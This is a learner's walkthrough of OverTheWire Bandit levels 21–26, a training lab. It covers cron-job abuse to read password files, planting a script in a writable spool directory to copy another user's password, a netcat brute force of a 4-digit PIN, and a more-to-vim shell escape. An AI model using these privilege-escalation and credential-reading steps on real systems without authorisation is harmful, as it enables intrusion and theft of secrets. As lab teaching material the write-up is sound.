## Core Security Concepts Reinforced
- Cron job abuse and scheduled task enumeration
- Deterministic filename generation and hash analysis
- Privilege escalation via misconfigured scripts
- Command injection via writable cron directories
- Basic brute-force automation
- Pager/editor shell escape techniques
- Execution context and permission boundaries

## Level 21 → 22: Cron Jobs and Scheduled Scripts

There's a cron job running on this system — a scheduled task that runs automatically at set intervals. The hint points to `/etc/cron.d/` where cron configurations are stored.

```bash
ls /etc/cron.d/
```

```
behemoth4_cleanup  cronjob_bandit22  cronjob_bandit24  leviathan5_cleanup    otw-tmp-dir
clean_tmp          cronjob_bandit23  e2scrub_all       manpage3_resetpw_job  sysstat

```

```bash
cat /etc/cron.d/cronjob_bandit22
```

```
~$ cat /etc/cron.d/cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null

```

So there's a script running every minute as bandit22. To see what it does:

```bash
cat /usr/bin/cronjob_bandit22.sh
```

```bash
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv

```
The script is writing bandit22's password to a file in `/tmp` every minute. Reading that file:

```bash
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

Before this I hadn't really thought about cron jobs from a security angle. A misconfigured scheduled script that writes sensitive data somewhere world-readable is a real problem.

---

## Level 22 → 23: Reading Someone Else's Cron Script

Same idea as before — there's another cron job, this time for bandit23.

```bash
cat /etc/cron.d/cronjob_bandit23
```

```
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null

```

```bash
cat /usr/bin/cronjob_bandit23.sh
```

```bash
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget

```
The script generates a filename by hashing the string `"I am user bandit23"` with md5sum and writes the password there. Since we can read the script, we can calculate the same filename ourselves:

```bash
echo I am user bandit23 | md5sum | cut -d ' ' -f 1
```

```bash
cat /tmp/<filename>
```

What made this interesting is that the script uses `whoami` to figure out who's running it — and since the cron job runs as bandit23, the hash is always based on `"I am user bandit23"`. We just needed to replicate that logic ourselves. Understanding what a script does line by line made all the difference here.

---

## Level 23 → 24: Writing Our Own Script for a Cron Job

This one required actually writing a script. There's a cron job running as bandit24 that executes and then deletes every script it finds in `/var/spool/bandit24/foo`. The idea is to drop a script in there that copies bandit24's password somewhere we can read it.

First, set up a working directory:

```bash
mkdir /tmp/mydir0044
chmod 777 /tmp/mydir0044
```

Then write the script:

```bash
cat > /var/spool/bandit24/foo/myscript.sh << EOF
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/mydir0044/password
EOF
```

Make it executable:

```bash
chmod +x /var/spool/bandit24/foo/myscript.sh
```

Wait a minute for the cron job to pick it up and run it, then:

```bash
cat /tmp/mydir0044/password
```

This was the first level where I had to write something from scratch rather than just reading or running existing commands. The `chmod 777` on the output directory is necessary because the script runs as bandit24 — without write permission for that user, it can't drop the file there. I used chmod 777 to make sure bandit24 could write to the directory, although in a real system minimum necessary permissions should be granted.The important realization was that the filename wasn’t random — it was deterministic. Since the input to md5sum is fixed when the job runs as bandit23, the output will always be the same.Timing also matters — if you check too early, the cron job hasn't run yet.

---

## Level 24 → 25: Brute Forcing a 4-Digit PIN

The next password is behind a service on port 30002. It accepts the current password followed by a 4-digit PIN. The only way to find the right PIN is to try all 10,000 possibilities.

Rather than doing this manually, wrote a quick script to generate every combination:

```bash
for i in $(seq -w 0000 9999); do
    echo "<password> $i"
done > /tmp/pins.txt
```

Then piped the whole list to the service:

```bash
cat /tmp/pins.txt | nc localhost 30002 | grep -v "Wrong"
```

The `grep -v "Wrong"` filters out all the failed attempts so only the success message shows. Running 10,000 requests takes a moment, but it gets there. This is a pretty basic brute force — in real scenarios services usually have rate limiting or lockout mechanisms to prevent exactly this, which is why those protections matter.

---

## Level 25 → 26: A Shell That Isn't Bash

Logging in as bandit25 gives us an SSH key for bandit26 right away. But connecting with it drops the connection almost immediately.

```bash
ssh -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220
```

Something is kicking us out before we can do anything. Checking what shell bandit26 is using:

```bash
cat /etc/passwd | grep bandit26
```

```
bandit26:x:11026:11026:bandit26:/home/bandit26:/usr/bin/showtext
```

The shell isn't bash — it's a custom program called `showtext`. Looking at what it does:

```bash
cat /usr/bin/showtext
```

```bash
#!/bin/sh

export TERM=linux

exec more ~/text.txt
exit 0
```

It opens a file using `more` and then exits. `more` is a pager — it displays content one screen at a time. If the terminal is tall enough to show the whole file at once, `more` just exits immediately, which is why we're getting dropped.

The trick is to make the terminal window very small — just a few lines tall — before connecting. That way `more` can't fit the whole file on screen and stays open. Once it's paused, pressing `v` opens the file in the default editor (vim), and from there we can run shell commands:

```
v
```

Inside vim:

```
:set shell=/bin/bash
:shell
```

That drops us into a bash shell as bandit26:

```bash
cat /etc/bandit_pass/bandit26
```

This one genuinely surprised me. The vulnerability here is that `more` has built-in functionality that lets you launch an editor, and from the editor you can get a shell. It's a good example of how chaining together small behaviours in unexpected ways can get you somewhere you shouldn't be — which is pretty much what a lot of real exploitation looks like.

---
